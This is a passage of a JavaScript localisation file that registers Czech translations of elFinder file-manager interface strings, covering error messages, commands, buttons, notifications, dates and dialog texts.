/**
 * Čeština translation
 * @author RobiNN <kelcakrobo@gmail.com>
 * @author Jay Gridley <gridley.jay@hotmail.com>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.cs = {
		translator : 'RobiNN &lt;kelcakrobo@gmail.com&gt;, Jay Gridley &lt;gridley.jay@hotmail.com&gt;',
		language   : 'Čeština',
		direction  : 'ltr',
		dateFormat : 'd. m. Y H:i', // will show like: 28. 02. 2022 11:30
		fancyDateFormat : '$1 H:i', // will show like: Dnes 11:30
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-113024
		messages   : {
			'getShareText' : 'Podíl',
			'Editor ': 'Editor kódu',
			/********************************** errors **********************************/
			'error'                : 'Chyba',
			'errUnknown'           : 'Neznámá chyba.',
			'errUnknownCmd'        : 'Neznámý příkaz.',
			'errJqui'              : 'Nedostačující konfigurace jQuery UI. Musí být zahrnuty komponenty Selectable, Draggable a Droppable.',
			'errNode'              : 'elFinder vyžaduje vytvořený DOM Elementu.',
			'errURL'               : 'Chybná konfigurace elFinderu! Není nastavena hodnota URL.',
			'errAccess'            : 'Přístup zamítnut.',
			'errConnect'           : 'Nepodařilo se připojit k backendu.',
			'errAbort'             : 'Připojení zrušeno.',
			'errTimeout'           : 'Vypšel limit pro připojení.',
			'errNotFound'          : 'Backend nenalezen.',
			'errResponse'          : 'Nesprávná odpověď backendu.',
			'errConf'              : 'Nepsrávná konfigurace backendu.',
			'errJSON'              : 'PHP modul JSON není nainstalován.',
			'errNoVolumes'         : 'Není dostupný čitelný oddíl.',
			'errCmdParams'         : 'Nesprávné parametry příkazu "$1".',
			'errDataNotJSON'       : 'Data nejsou ve formátu JSON.',
			'errDataEmpty'         : 'Data jsou prázdná.',
			'errCmdReq'            : 'Dotaz backendu vyžaduje název příkazu.',
			'errOpen'              : 'Chyba při otevírání "$1".',
			'errNotFolder'         : 'Objekt není složka.',
			'errNotFile'           : 'Objekt není soubor.',
			'errRead'              : 'Chyba při čtení "$1".',
			'errWrite'             : 'Chyba při zápisu do "$1".',
			'errPerm'              : 'Přístup odepřen.',
			'errLocked'            : '"$1" je uzamčený a nemůže být přejmenován, přesunut nebo smazán.',
			'errExists'            : 'Soubor s názvem "$1" již existuje.',
			'errInvName'           : 'Nesprávný název souboru.',
			'errInvDirname'        : 'Neplatný název adresáře.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Složka nenalezena.',
			'errFileNotFound'      : 'Soubor nenalezen.',
			'errTrgFolderNotFound' : 'Cílová složka "$1" nenalezena.',
			'errPopup'             : 'Prohlížeč zabránil otevření vyskakovacího okna. K otevření souboru, povolte vyskakovací okno v prohlížeči.',
			'errMkdir'             : 'Nepodařilo se vytvořit složku "$1".',
			'errMkfile'            : 'Nepodařilo se vytvořit soubor "$1".',
			'errRename'            : 'Nepodařilo se přejmenovat "$1".',
			'errCopyFrom'          : 'Kopírování souborů z oddílu "$1" není povoleno.',
			'errCopyTo'            : 'Kopírování souborů do oddílu "$1" není povoleno.',
			'errMkOutLink'         : 'Nelze vytvořit odkaz mimo kořenového svazku.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Chyba nahrávání.',  // old name - errUploadCommon
			'errUploadFile'        : 'Nepodařilo se nahrát "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Nejsou vybrány žádné soubory k nahrání.',
			'errUploadTotalSize'   : 'Překročena maximální povolená velikost dat.', // old name - errMaxSize
			'errUploadFileSize'    : 'Překročena maximální povolená velikost souboru.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Nepovolený typ souboru.',
			'errUploadTransfer'    : '"$1" chyba přenosu.',
			'errUploadTemp'        : 'Nelze vytvořit dočasný soubor pro upload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Objekt "$1" v tomto umístění již existuje a nelze jej nahradit s jiným typem objektu.', // new
			'errReplace'           : 'Nelze nahradit "$1".',
			'errSave'              : '"$1" nelze uložit.',
			'errCopy'              : '"$1" nelze zkopírovat.',
			'errMove'              : '"$1" nelze přemístit.',
			'errCopyInItself'      : '"$1" nelze zkopírovat do sebe sama.',
			'errRm'                : '"$1" nelze odstranit.',
			'errTrash'             : 'Nelze se dostat do koše.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Nelze odstranit zdrojový soubor(y).',
			'errExtract'           : 'Nelze extrahovat soubory z "$1".',
			'errArchive'           : 'Nelze vytvořit archív.',
			'errArcType'           : 'Nepodporovaný typ archívu.',
			'errNoArchive'         : 'Soubor není archív nebo má nepodporovaný formát.',
			'errCmdNoSupport'      : 'Backend tento příkaz nepodporuje.',
			'errReplByChild'       : 'Složka "$1" nemůže být nahrazena souborem, který sama obsahuje.',
			'errArcSymlinks'       : 'Z bezpečnostních důvodů je zakázáno rozbalit archívy obsahující symlinky.', // edited 24.06.2012
			'errArcMaxSize'        : 'Soubory archívu překračují maximální povolenou velikost.',
			'errResize'            : 'Nepodařilo se změnit velikost obrázku "$1".',
			'errResizeDegree'      : 'Neplatný stupeň rotace.',  // added 7.3.2013
			'errResizeRotate'      : 'Nelze otočit obrázek.',  // added 7.3.2013
			'errResizeSize'        : 'Neplatná velikost obrázku.',  // added 7.3.2013
			'errResizeNoChange'    : 'Velikost obrazu se nezmění.',  // added 7.3.2013
			'errUsupportType'      : 'Nepodporovaný typ souboru.',
			'errNotUTF8Content'    : 'Soubor "$1" nemá ani obsah kódovaný v UTF-8 a nelze změnit.',  // added 9.11.2011
			'errNetMount'          : 'Není možné se připojit "$ 1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Nepodporovaný protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Připojení se nezdařilo.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Hostitel se vyžaduje.', // added 18.04.2012
			'errSessionExpires'    : 'Relace byla ukončena z důvodu nečinnosti.',
			'errCreatingTempDir'   : 'Nelze vytvořit dočasný adresář: "$1"',
			'errFtpDownloadFile'   : 'Nelze stáhnout soubor z FTP: "$1"',
			'errFtpUploadFile'     : 'Nelze nahrát soubor na FTP: "$1"',
			'errFtpMkdir'          : 'Nepodařilo se vytvořit vzdálený adresář na FTP: "$1"',
			'errArchiveExec'       : 'Při archivaci do souboru došlo k chybě: "$1"',
			'errExtractExec'       : 'Chyba při extrahování souboru: "$1"',
			'errNetUnMount'        : 'Nepodařilo se odpojit', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Nelze převést na UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Chcete-li nahrát složku, zkuste moderní prohlížeč.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Vypršení časového limitu při hledání "$1". Je částečně výsledkem hledání.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Opětovné povolení je nutné.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Maximální počet volitelných předmětů je $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Nelze obnovit z koše. Nelze identifikovat cíl obnovení.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editor tohoto typu souboru nebyl nalezen.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Došlo k chybě na straně serveru.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Nelze vyprázdnit složku "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Existují ještě další $1 chyby.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Můžete vytvořit až $1 složek najednou.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Vytvořit archív',
			'cmdback'      : 'Zpět',
			'cmdcopy'      : 'Kopírovat',
			'cmdcut'       : 'Vyjmout',
			'cmddownload'  : 'Stáhnout',
			'cmdduplicate' : 'Duplikovat',
			'cmdedit'      : 'Upravit soubor',
			'cmdextract'   : 'Rozbalit archív',
			'cmdforward'   : 'Vpřed',
			'cmdgetfile'   : 'Vybrat soubory',
			'cmdhelp'      : 'O softwaru',
			'cmdhome'      : 'Domů',
			'cmdinfo'      : 'Zobrazit informace',
			'cmdmkdir'     : 'Nová složka',
			'cmdmkdirin'   : 'Do nové složky', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nový soubor',
			'cmdopen'      : 'Otevřít',
			'cmdpaste'     : 'Vložit',
			'cmdquicklook' : 'Náhled',
			'cmdreload'    : 'Obnovit',
			'cmdrename'    : 'Přejmenovat',
			'cmdrm'        : 'Smazat',
			'cmdtrash'     : 'Do koše', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Obnovit', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Najít soubory',
			'cmdup'        : 'Přejít do nadřazené složky',
			'cmdupload'    : 'Nahrát soubor(y)',
			'cmdview'      : 'Zobrazit',
			'cmdresize'    : 'Změnit velikost',
			'cmdsort'      : 'Seřadit',
			'cmdnetmount'  : 'Připojit síťovou jednotku', // added 18.04.2012
			'cmdnetunmount': 'Odpojit', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Umístění', // added 28.12.2014
			'cmdchmod'     : 'Změnit režim', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Otevření složky', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Obnovení šířku sloupce', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Celá obrazovka', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Posouvat', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Vyprázdnit složku', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Krok zpět', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Udělat to znovu', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preference', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Vyberat vše', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Nic nevyberať', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Invertovat výběr', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Otevři v novém okně', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Skrýt (Předvolba)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Zavřít',
			'btnSave'   : 'Uložit',
			'btnRm'     : 'Odstranit',
			'btnApply'  : 'Použít',
			'btnCancel' : 'Zrušit',
			'btnNo'     : 'Ne',
			'btnYes'    : 'Ano',
			'btnMount'  : 'Připojit',  // added 18.04.2012
			'btnApprove': 'Přejít do části 1 $ & schválit', // from v2.1 added 26.04.2012
			'btnUnmount': 'Odpojit', // from v2.1 added 30.04.2012
			'btnConv'   : 'Převést', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Tu',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Médium',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Všechno',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME typ', // from v2.1 added 22.5.2015
			'btnFileName':'Název souboru',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Uložit & zavřít', // from v2.1 added 12.6.2015
			'btnBackup' : 'Zálohovat', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Přejmenovat',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Přejmenovat vše', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Předch ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Další ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Uložit jako', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Otevírání složky',
			'ntffile'     : 'Otevírání souboru',
			'ntfreload'   : 'Obnovování obsahu složky',
			'ntfmkdir'    : 'Vytváření složky',
			'ntfmkfile'   : 'Vytváření souborů',
			'ntfrm'       : 'Vymazání položek',
			'ntfcopy'     : 'Kopírování položek',
			'ntfmove'     : 'Přemístění položek',
			'ntfprepare'  : 'Kontrola existujících položek',
			'ntfrename'   : 'Přejmenovávání souborů',
			'ntfupload'   : 'Nahrávání souborů',
			'ntfdownload' : 'Stahování souborů',
			'ntfsave'     : 'Ukládání souborů',
			'ntfarchive'  : 'Vytváření archívu',
			'ntfextract'  : 'Rozbalování souborů z archívu',
			'ntfsearch'   : 'Vyhledávání souborů',
			'ntfresize'   : 'Změna velikosti obrázků',
			'ntfsmth'     : 'Čekejte prosím...',
			'ntfloadimg'  : 'Načítání obrázků',
			'ntfnetmount' : 'Připojení síťového média', // added 18.04.2012
			'ntfnetunmount': 'Odpojení síťového média', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Získejte rozměr obrazu', // added 20.05.2013
			'ntfreaddir'  : 'Přečtěte si informace o složce', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Získejte adresu URL odkazu', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Změna souboru', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Zkontrolujte název nahravaného souboru', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Vytvořit soubor ke stažení', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Získání informací o cestě', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Zpracování nahraného souboru', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Hodit do koše', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Obnova z koše', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Kontrola cílové složky', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Zrušit  předchozí operaci', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Obnovit předchozí zrušení', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Kontrola obsahu', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Koš', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'neznámý',
			'Today'       : 'Dnes',
			'Yesterday'   : 'Včera',
			'msJan'       : 'Led',
			'msFeb'       : 'Úno',
			'msMar'       : 'Bře',
			'msApr'       : 'Dub',
			'msMay'       : 'Kvě',
			'msJun'       : 'Čer',
			'msJul'       : 'Čec',
			'msAug'       : 'Srp',
			'msSep'       : 'Zář',
			'msOct'       : 'Říj',
			'msNov'       : 'Lis',
			'msDec'       : 'Pro',
			'January'     : 'Leden',
			'February'    : 'Únor',
			'March'       : 'Březen',
			'April'       : 'Duben',
			'May'         : 'Květen',
			'June'        : 'Červen',
			'July'        : 'Červenec',
			'August'      : 'Srpen',
			'September'   : 'Září',
			'October'     : 'Říjen',
			'November'    : 'Listopad',
			'December'    : 'Prosinec',
			'Sunday'      : 'Neděle',
			'Monday'      : 'Pondělí',
			'Tuesday'     : 'Úterý',
			'Wednesday'   : 'Středa',
			'Thursday'    : 'Čtvrtek',
			'Friday'      : 'Pátek',
			'Saturday'    : 'Sobota',
			'Sun'         : 'Ne',
			'Mon'         : 'Po',
			'Tue'         : 'Út',
			'Wed'         : 'St',
			'Thu'         : 'Čt',
			'Fri'         : 'Pá',
			'Sat'         : 'So',

			/******************************** sort variants ********************************/
			'sortname'          : 'dle jména',
			'sortkind'          : 'dle typu',
			'sortsize'          : 'dle velikosti',
			'sortdate'          : 'dle data',
			'sortFoldersFirst'  : 'Napřed složky',
			'sortperm'          : 'dle povolení', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'dle módu',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'dle majitele',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'dle skupiny',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Také stromové zobrazení',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Nový soubor.txt', // added 10.11.2015
			'untitled folder'   : 'Nová složka',   // added 10.11.2015
			'Archive'           : 'Nový archiv',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Nový soubor.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1 soubor',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Požadováno potvrzení',
			'confirmRm'       : 'Opravdu chcete odstranit tyto soubory?<br/>Operace nelze vrátit!',
			'confirmRepl'     : 'Nahradit staré soubory novými?',
			'confirmRest'     : 'Nahradit stávající položku položkou z koše?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Není v UTF-8, převést do UTF-8?<br/>Obsah po převodu se stává UTF-8.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Kódování tohoto souboru nemoholo rozpoznán. Pro úpravy je třeba dočasně převést do kódování UTF-8.<br/>Prosím, vyberte kódování znaků souboru.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Byl změněn.<br/>Pokud obsahuje neuložené změny, dojde ke ztrátě práce.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Opravdu chcete položky přesunout do koše?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Opravdu chcete položky přesunout do "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Pro všechny',
			'name'            : 'Název',
			'size'            : 'Velikost',
			'perms'           : 'Práva',
			'modify'          : 'Upravený',
			'kind'            : 'Typ',
			'read'            : 'čtení',
			'write'           : 'zápis',
			'noaccess'        : 'přístup odepřen',
			'and'             : 'a',
			'unknown'         : 'neznámý',
			'selectall'       : 'Vybrat všechny položky',
			'selectfiles'     : 'Vybrat položku(y)',
			'selectffile'     : 'Vybrat první položku',
			'selectlfile'     : 'Vybrat poslední položku',
			'viewlist'        : 'Seznam',
			'viewicons'       : 'Ikony',
			'viewSmall'       : 'Malé ikony', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Střední ikony', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Velké ikony', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Extra velké ikony', // from v2.1.39 added 22.5.2018
			'places'          : 'Místa',
			'calc'            : 'Vypočítat',
			'path'            : 'Cesta',
			'aliasfor'        : 'Zástupce pro',
			'locked'          : 'Uzamčený',
			'dim'             : 'Rozměry',
			'files'           : 'Soubory',
			'folders'         : 'Složky',
			'items'           : 'Položky',
			'yes'             : 'ano',
			'no'              : 'ne',
			'link'            : 'Odkaz',
			'searcresult'     : 'Výsledky hledání',
			'selected'        : 'vybrané položky',
			'about'           : 'O softwaru',
			'shortcuts'       : 'Zkratky',
			'help'            : 'Nápověda',
			'webfm'           : 'Webový správce souborů',
			'ver'             : 'Verze',
			'protocolver'     : 'verze protokolu',
			'homepage'        : 'Domovská stránka projektu',
			'docs'            : 'Dokumentace',
			'github'          : 'Najdete nás na Gitgube',
			'twitter'         : 'Následujte nás na Twitteri',
			'facebook'        : 'Připojte se k nám na Facebooku',
			'team'            : 'Tým',
			'chiefdev'        : 'séf vývojářů',
			'developer'       : 'vývojár',
			'contributor'     : 'spolupracovník',
			'maintainer'      : 'údržba',
			'translator'      : 'překlad',
			'icons'           : 'Ikony',
			'dontforget'      : 'a nezapomeňte si vzít plavky',
			'shortcutsof'     : 'Zkratky nejsou povoleny',
			'dropFiles'       : 'Sem přetáhněte soubory',
			'or'              : 'nebo',
			'selectForUpload' : 'Vyberte soubory',
			'moveFiles'       : 'Přesunout sobory',
			'copyFiles'       : 'Zkopírovat soubory',
			'restoreFiles'    : 'Obnovit položky', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Odstranit z míst',
			'aspectRatio'     : 'Poměr stran',
			'scale'           : 'Měřítko',
			'width'           : 'Šířka',
			'height'          : 'Výška',
			'resize'          : 'Změnit vel.',
			'crop'            : 'Ořezat',
			'rotate'          : 'Otočit',
			'rotate-cw'       : 'Otočit o +90 stupňů',
			'rotate-ccw'      : 'Otočit o -90 stupňů',
			'degree'          : ' stupňů',
			'netMountDialogTitle' : 'Připojení síťového média', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Hostitel', // added 18.04.2012
			'port'                : 'Přístav', // added 18.04.2012
			'user'                : 'Uživatel', // added 18.04.2012
			'pass'                : 'Heslo', // added 18.04.2012
			'confirmUnmount'      : 'Chcete odpojit $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Přemístěte nebo přesuňte soubory z prohlížeče', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Zde přemístěte nebo přesuňte soubory a adresy URL', // from v2.1 added 07.04.2014
			'encoding'        : 'Kódování', // from v2.1 added 19.12.2014
			'locale'          : 'Lokalizce',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Cíl: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Vyhledávání podle vstupního MIME typu', // from v2.1 added 22.5.2015
			'owner'           : 'Majitel', // from v2.1 added 20.6.2015
			'group'           : 'Skupina', // from v2.1 added 20.6.2015
			'other'           : 'Ostatní', // from v2.1 added 20.6.2015
			'execute'         : 'Spustit', // from v2.1 added 20.6.2015
			'perm'            : 'Povolení', // from v2.1 added 20.6.2015
			'mode'            : 'Režim', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Složka je prázdná', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Složka je prázdná, přesunout nebo zkontrolovat položky', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Složka je prázdná, dlouhim kliknutím přidáte položky', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kvalita', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Automatická synchronizace',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Přesunout nahoru',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Získat URL odkaz', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Vybrané položky ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID složky', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Povolit přístup offline', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Znovu ověřit', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Načítání...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Otevření více souborů', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Pokoušíte se otevřít soubor $1. Chcete jej otevřít v prohlížeči?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Výsledky hledání jsou prázdné', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Upravujete soubor.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Vybrali jste $1 položky.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Máte $1 položky v schránce.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Inkrementální hledání je pouze z aktuálního zobrazení.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Obnovit', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 kompletní', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontextové menu', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Otáčení stránky', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Kořeny média', // from v2.1.16 added 16.9.2016
			'reset'           : 'Obnovit', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Barva pozadí', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Výběr barvy', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px mřížka', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Povoleno', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Zakázáno', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Výsledky hledání jsou prázdné v aktuálním zobrazení.\\Stisknutím tlačítka [Enter] rozšíříte vyhledávání cíle.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Výsledky vyhledávání prvního listu jsou v aktuálním zobrazení prázdné.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Nápis textu', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 minut zůstává', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Otevřít pomocí zvoleného kódování', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Uložit s vybraným kódováním', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Vyberte složku', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Hledání prvního listu', // from v2.1.23 added 24.3.2017
			'presets'         : 'Předvolby', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Je to příliš mnoho položek, takže se nemohou dostat do koše.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Textarea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Vyprázdnit složku "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Ve složce "$1" nejsou žádné položky.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Předvolby', // from v2.1.26 added 28.6.2017
			'language'        : 'Nastavte jazyk', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicializujte nastavení uložená v tomto prohlížeči', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Nastavení panelu nástrojů', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '...$1 znaků zbývá.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '...$1 řádků zůstává.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Součet', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Hrubá velikost souboru', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Zaměření na prvek dialogu s mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Vybrat', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Akce při vybraném souboru', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Otevřít pomocí naposledy použitého editoru', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Obrátit výběr položek', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Opravdu chcete přejmenovat $1 vybraných položek, jako například $2<br/>Není to možné vrátit zpět!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Batch přejmenování', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Číslo', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Přidat předponu', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Přidat příponu', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Změnit příponu', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Nastavení sloupců (Zobrazení seznamu)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Všechny změny se okamžitě projeví v archivu.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Jakékoliv změny se nebudou odrážet, dokud nebude tento svazek odpojen.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Následující svazky namontované na tomto svazku jsou také odpojeny. Opravdu ji odpojíte?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informace o výběru', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmy pro zobrazení hashování souborů', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Informační položky (panel s informacemi o výběru)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Dalším stisknutím opustíte.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Panel nástrojů', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Pracovní prostor', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialogové okno', // from v2.1.38 added 4.4.2018
			'all'             : 'Všechno', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Velikost ikony (zobrazení ikon)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Otevřete maximalizované okno editora', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Protože konverze podle API momentálně není k dispozici, převeďte na webové stránce.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Po konverzi musíte nahrát převeden soubor pomocí URL položky nebo stažený soubor k uložení převedeného souboru.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Převést na stránce $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrace', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Tento elFinder má integrované následující externí služby. Před použitím zkontrolujte podmínky používání, zásady ochrany osobních údajů atd.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Zobrazit skryté položky', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Skrýt skryté položky', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Zobrazit/skrýt skryté položky', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Typy souborů, jež mají být povoleny pomocí "Nový soubor"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Typ textového souboru', // from v2.1.41 added 7.8.2018
			'add'             : 'Přidat', // from v2.1.41 added 7.8.2018
			'theme'           : 'Téma', // from v2.1.43 added 19.10.2018
			'default'         : 'Výchozí', // from v2.1.43 added 19.10.2018
			'description'     : 'Popis', // from v2.1.43 added 19.10.2018
			'website'         : 'Stránka', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licence', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Tuto položku nelze uložit. Abyste se vyhnuli ztrátě úprav, musíte je exportovat do počítače.', // from v2.1.44 added 1.12.2018
